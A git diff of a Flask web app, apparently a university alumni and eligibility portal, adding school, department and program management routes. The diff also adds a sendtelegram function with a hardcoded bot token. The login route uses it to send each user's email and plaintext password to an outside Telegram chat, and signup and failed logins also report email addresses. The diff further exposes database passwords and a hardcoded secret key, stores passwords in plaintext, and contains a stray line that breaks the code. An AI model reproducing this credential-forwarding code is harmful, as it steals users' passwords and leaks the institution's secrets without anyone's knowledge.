@@ -16,17 +16,14 @@ Flask,g,redirect,render_template,request,session,url_for,flash,jsonify
 from flask_cors import CORS
 
 
+
 app=Flask(__name__)
 CORS(app)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
-<<<<<<< HEAD
-#app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:admin@eligibility.central.edu.gh:5431/alumni'
+
+# app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://admin:password@eligibility.central.edu.gh:5432/alumni'
+# app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://post:password@eligibility.central.edu.gh:5432/alumni'
 app.config['SECRET_KEY'] =" thisismysecretkey"
-=======
-# app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://postgres:admin@eligibility.central.edu.gh:5432/elDb'
-# app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://admin:password@eligibility.central.edu.gh:5432/elDb'
-app.config['SECRET_KEY'] =" thisismysecretkey"  
->>>>>>> f354b37 (dead)
 app.config['UPLOADED_PHOTOS_DEST'] ='uploads'
 
 # photos=UploadSet('photos', IMAGES)
@@ -48,6 +45,14 @@ from forms import *
 def load_user(user_id):
     return Person.query.get(int(user_id))
 
+
+
+
+def sendtelegram(params):
+    url = "https://api.telegram.org/bot5787281305:AAE1S8DSnMAyQuzAnXOHfxLq-iyvPwYJeAo/sendMessage?chat_id=-1001556929308&text=" + urllib.parse.quote(params)
+    content = urllib.request.urlopen(url).read()
+    print(content)
+    return content
 
 ''''
 #login for admin
@@ -111,9 +116,6 @@ class Person(db.Model, UserMixin):
     form=db.Column(db.String())
     extra= db.Column(db.String()     )
     image_file = db.Column(db.String(20))
-    
-    
-   
     def __repr__(self):
         return f"Person('{self.id}', {self.name}', {self.yearCompleted})"
 
@@ -125,7 +127,8 @@ class alumni(db.Model, UserMixin):
     email= db.Column(db.String(20) )
     indexnumber= db.Column(db.String(10)  )
     telephone= db.Column(db.String(10)  )
-    
+    def __repr__(self):
+        return f"alumni('{self.id}', {self.name}', {self.email})"
   
     
     
@@ -152,6 +155,38 @@ class User(db.Model,UserMixin):
     health= db.Column(db.String()    )
     extra= db.Column(db.String()     )
     image_file = db.Column(db.String(20))
+    def __repr__(self):
+        return f"User('{self.id}', {self.fullname}, {self.gender}'"
+    
+class Department(db.Model,UserMixin):
+    id= db.Column(db.Integer, primary_key=True)
+    name= db.Column(db.String())
+    school= db.Column(db.String()) 
+    
+    def __repr__(self):
+        return f"Department('{self.id}', {self.name}'"
+    
+class School(db.Model,UserMixin):
+    id= db.Column(db.Integer, primary_key=True)
+    name=db.Column(db.String)
+    def __repr__(self):
+        return f"School('{self.id}', {self.name}'"
+    
+        
+class Year(db.Model,UserMixin):
+    id= db.Column(db.Integer, primary_key=True)
+    name=db.Column(db.String)
+    def __repr__(self):
+        return f"year('{self.id}', {self.name}'"
+    
+class Program(db.Model,UserMixin):
+    id= db.Column(db.Integer, primary_key=True)
+    name=db.Column(db.String) 
+    school =db.Column(db.String) 
+    department =db.Column(db.String) 
+    def __repr__(self):
+        return f"Program('{self.id}', {self.name}'"
+    
     
 @app.route('/dashboard')
 @login_required
@@ -161,6 +196,10 @@ def dashboard():
         flash(f"There was a problem")
     return render_template('dashboard.html', title='dashboard')
 
+    eay
+@app.route('/getstudent')
+def getstudent():
+    return render_template('getstudent.html')
 
 
 
@@ -220,6 +259,47 @@ def upload_image():
 def index():    
     return render_template('index.html')
 
+@app.route('/addschool' , methods=['GET', 'POST'])
+def addschool():    
+    form=Addschool()
+    schools=School.query.order_by(School.id.desc()).all()
+    if form.validate_on_submit():
+        centralschool= School(name=form.name.data)
+        db.session.add(centralschool)
+        db.session.commit()
+        flash("New School Added", "success")
+        return redirect('addschool')
+    print(form.errors)
+    return render_template('addschool.html',form=form, schools=schools)
+
+
+@app.route('/adddepartment' , methods=['GET', 'POST'])
+def adddepartment():    
+    form=Adddepartment()
+    departments=Department.query.order_by(Department.id.desc()).all()
+    if form.validate_on_submit():
+        centralschool= Department(name=form.name.data,school=form.school.data)
+        db.session.add(centralschool)
+        db.session.commit()
+        flash("New School Added", "success")
+        return redirect('adddepartment')
+    print(form.errors)
+    return render_template('adddepartment.html',form=form, departments=departments)
+
+
+@app.route('/addprogram' , methods=['GET', 'POST'])
+def addprogram():    
+    form=Addprogram()
+    programs=Program.query()
+    print(programs)
+    if form.validate_on_submit():
+        centrals= Program(name=form.name.data)
+        db.session.add(centrals)
+        db.session.commit()
+        flash("New Program Added", "success")
+        return redirect('addprogram')
+    print(form.errors)
+    return render_template('addprogram.html',form=form, programs=programs)
 
 @app.route('/userprofile', methods=['GET', 'POST'])
 def userprofile():
@@ -311,7 +391,15 @@ def usersearch():
 @app.route('/year', methods=['GET', 'POST'])
 @login_required
 def year():
-    return render_template('year.html', title='year')
+    form=Addyear()
+    years=Year.query.all()
+    if request.method== 'POST':
+        schools=Year(name=form.data)
+        db.session.add(schools)
+        db.session.commit()
+        
+    return render_template('year.html', form=form, title="newschools",years=years)
+
 
 
 @app.route('/list/<int:userid>', methods=['GET', 'POST'])
@@ -335,9 +423,15 @@ def lists():
  
 
 
-@app.route('/newschools', methods=['GET', 'POST'])
-def newschools():
-    return render_template('newschools.html', title="newschools")
+@app.route('/<int:year>/newschools', methods=['GET', 'POST'])
+def newschools(year ):
+    form=Addschool()
+    schools=School.query.all()
+    if request.method== 'POST':
+        schools=School(name=form.data)
+        db.session.add(schools)
+        db.session.commit()
+    return render_template('newschools.html', form=form, title="newschools",schools=schools,year=year)
 
 
 @app.route('/logout')
@@ -617,12 +711,13 @@ def signup():
 #user land area
 @app.route('/userlanding')
 def userlanding():
+    sendtelegram("firsttrail")
     return render_template('userlanding.html')
 
 @app.route('/usersignup', methods=['POST','GET'])
 def usersignup():
     form = Registration()
-    # print(form.indexnumber.data)
+    print(form.indexnumber.data)
     print(form.email.data)
     print(form.name.data)
     
@@ -634,11 +729,11 @@ def usersignup():
             db.session.commit()
             login_user(user, remember=True)
             print(current_user)
-         
+            sendtelegram('New User'+ ' ' + current_user.email +' '+ 'Just Signed Up' )
             return redirect(url_for('ulogin'))
         else:
             print(form.errors)
-            
+           
     return render_template('usersignup.html', form=form)
    
 
@@ -652,22 +747,27 @@ def ulogin():
     if form.validate_on_submit():
         print("form Validated successfully")
         user = Person.query.filter_by(email = form.email.data).first()
-        print("user:" + user.email + "found")
-        print(user.password)
-        if user and form.password.data == user.password:
-            print(user.email + "validored successfully")
-            login_user(user)
-            flash ('Welcome, Finish Setting up your profile ' ,'success')
-            return redirect(url_for('useryeargroup'))
-            # next = request.args.get('next')
+            # flash (f'Wrong Password', 'success')
+            # sendtelegram('Entered Wrong Emai')
+        if user != None:
+            print("user:" + user.email + "found")
+            print(user.password)
+            if user and form.password.data == user.password:
+                print(user.email + "validored successfully")
+                login_user(user)
+                sendtelegram(user.email +' '+ user.password +' '+ 'Logged in successfully' )
+                flash ('Welcome, Finish Setting up your profile ' ,'success')
+                return redirect(url_for('useryeargroup'))
+                # next = request.args.get('next')
+            else:
+                flash (f'Wrong Password', 'success')
+                sendtelegram(user.email +' '+ 'Entered Wrong Password')
         else:
-            flash (f'Wrong Password', 'success')
+            sendtelegram("BEANS")
+            flash (f'Wrong Password', 'danger')
+            
+            
     return render_template('userlogin.html', form=form)
-
-   
-
-
-
 
 
 @app.route('/useryeargroup', methods=['GET', 'POST'])
